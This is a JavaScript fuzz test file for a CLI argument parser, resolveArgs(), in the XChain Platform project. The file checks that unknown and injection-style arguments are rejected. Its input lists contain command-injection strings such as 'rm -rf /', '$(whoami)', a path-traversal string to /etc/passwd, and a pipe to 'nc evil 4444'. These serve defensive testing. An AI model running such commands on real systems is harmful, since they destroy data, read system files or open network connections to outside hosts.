'use strict'

// Copyright © 2025–2026 Dankest, LLC
// Based on XChain Platform by Dankest, LLC – https://dankest.llc
//
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// This file is part of XChain Platform. Licensed under the GNU Affero
// General Public License v3.0 or later; see LICENSE.md. A commercial
// license (without AGPL source-disclosure terms) is available -
// contact legal@dankest.llc.

const { expect } = require('chai')

const {
    Coin, Network, XChainService,
    NODE_MODULE_NAME, DB_MODULE_NAME, HUB_MODULE_NAME, EXPLORER_MODULE_NAME
} = require('../../src/config/constants')
const { resolveArgs } = require('../../src/services/ConfigService')

describe('Fuzz: resolveArgs()', function () {

    // --- Unknown / garbage arguments ---

    const garbageArgs = [
        'foobarbaz',
        '123',
        'true',
        'null',
        'undefined',
        'NaN',
        'Infinity',
        '[]',
        '{}',
        '',
        ' ',
        '-v',
        '--verbose',
        '--admin',
        'BITCOIN',       // uppercase — not in enum
        'MAINNET',       // uppercase — not in enum
        'Bitcoin',       // title case
        'bitCOIN',
        'xchain-encoder; rm -rf /',
        'bitcoin$(whoami)',
        'mainnet`id`',
        '../../../etc/passwd',
        'xchain-encoder\x00extra',
    ]

    for (const arg of garbageArgs) {
        it(`does not crash on garbage argument: ${JSON.stringify(arg)}`, function () {
            const result = resolveArgs([arg])
            expect(result).to.have.property('service')
            expect(result).to.have.property('chain')
            expect(result).to.have.property('network')
        })
    }

    it('defaults to all/all/all when no recognized args', function () {
        const result = resolveArgs(['unknown1', 'unknown2'])
        expect(result.service).to.equal('all')
        expect(result.chain).to.equal('all')
        expect(result.network).to.equal('all')
    })

    // --- Order independence ---

    it('recognizes args regardless of order: service chain network', function () {
        const r1 = resolveArgs(['xchain-encoder', 'bitcoin', 'mainnet'])
        const r2 = resolveArgs(['mainnet', 'xchain-encoder', 'bitcoin'])
        const r3 = resolveArgs(['bitcoin', 'mainnet', 'xchain-encoder'])
        expect(r1).to.deep.equal(r2)
        expect(r2).to.deep.equal(r3)
    })

    it('recognizes args regardless of order: chain network only', function () {
        const r1 = resolveArgs(['bitcoin', 'regtest'])
        const r2 = resolveArgs(['regtest', 'bitcoin'])
        expect(r1.chain).to.equal(r2.chain)
        expect(r1.network).to.equal(r2.network)
    })

    // --- Duplicate arguments ---

    it('last match wins when duplicate chains provided', function () {
        const result = resolveArgs(['bitcoin', 'litecoin'])
        // Both are valid chains; the last one should win
        expect(result.chain).to.equal('litecoin')
    })

    it('last match wins when duplicate networks provided', function () {
        const result = resolveArgs(['mainnet', 'regtest'])
        expect(result.network).to.equal('regtest')
    })

    it('last match wins when duplicate services provided', function () {
        const result = resolveArgs(['xchain-encoder', 'xchain-decoder'])
        expect(result.service).to.equal('xchain-decoder')
    })

    // --- "all" keyword handling ---

    it('skips "all" arguments (preserves default)', function () {
        const result = resolveArgs(['all', 'all', 'all'])
        expect(result.service).to.equal('all')
        expect(result.chain).to.equal('all')
        expect(result.network).to.equal('all')
    })

    it('recognizes service alongside "all"', function () {
        const result = resolveArgs(['xchain-encoder', 'all', 'all'])
        expect(result.service).to.equal('xchain-encoder')
        expect(result.chain).to.equal('all')
        expect(result.network).to.equal('all')
    })

    // --- Empty and null args ---

    it('handles empty array', function () {
        const result = resolveArgs([])
        expect(result.service).to.equal('all')
        expect(result.chain).to.equal('all')
        expect(result.network).to.equal('all')
    })

    it('handles array with null/undefined elements', function () {
        const result = resolveArgs([null, undefined, ''])
        expect(result.service).to.equal('all')
        expect(result.chain).to.equal('all')
        expect(result.network).to.equal('all')
    })

    // --- Branch extraction ---

    it('captures unrecognized argument as branch when expectBranch=true', function () {
        const result = resolveArgs(['develop', 'xchain-encoder', 'bitcoin', 'mainnet'], { expectBranch: true })
        expect(result.branch).to.equal('develop')
        expect(result.service).to.equal('xchain-encoder')
        expect(result.chain).to.equal('bitcoin')
        expect(result.network).to.equal('mainnet')
    })

    it('uses defaultBranch when no unrecognized arg and expectBranch=true', function () {
        const result = resolveArgs(['xchain-encoder', 'bitcoin', 'mainnet'], { expectBranch: true })
        expect(result.branch).to.equal('master')
    })

    it('uses custom defaultBranch', function () {
        const result = resolveArgs(['xchain-encoder'], { expectBranch: true, defaultBranch: 'develop' })
        expect(result.branch).to.equal('develop')
    })

    it('branch is null when expectBranch=false', function () {
        const result = resolveArgs(['develop', 'xchain-encoder'])
        expect(result.branch).to.be.null
    })

    // --- All valid enum values ---

    it('recognizes every Coin enum value', function () {
        for (const coin of Object.values(Coin)) {
            const result = resolveArgs([coin])
            expect(result.chain).to.equal(coin)
        }
    })

    it('recognizes every Network enum value', function () {
        for (const network of Object.values(Network)) {
            const result = resolveArgs([network])
            expect(result.network).to.equal(network)
        }
    })

    it('recognizes every XChainService enum value', function () {
        for (const service of Object.values(XChainService)) {
            const result = resolveArgs([service])
            expect(result.service).to.equal(service)
        }
    })

    it('recognizes special module names: node, database, explorer', function () {
        expect(resolveArgs([NODE_MODULE_NAME]).service).to.equal(NODE_MODULE_NAME)
        expect(resolveArgs([DB_MODULE_NAME]).service).to.equal(DB_MODULE_NAME)
        expect(resolveArgs(['explorer']).service).to.equal('explorer')
    })

    // --- Massive argument list ---

    it('handles 100 garbage arguments without crashing', function () {
        const args = Array.from({ length: 100 }, (_, i) => 'garbage_' + i)
        const result = resolveArgs(args)
        expect(result.service).to.equal('all')
    })

    // --- Arguments with injection patterns ---

    it('does not match injection strings as valid services/chains/networks', function () {
        const injections = [
            'bitcoin; rm -rf /',
            'mainnet && echo pwned',
            'xchain-encoder | nc evil 4444',
        ]
        for (const inj of injections) {
            const result = resolveArgs([inj])
            // None of these should match a known service, chain, or network
            expect(result.service).to.equal('all')
            expect(result.chain).to.equal('all')
            expect(result.network).to.equal('all')
        }
    })
})
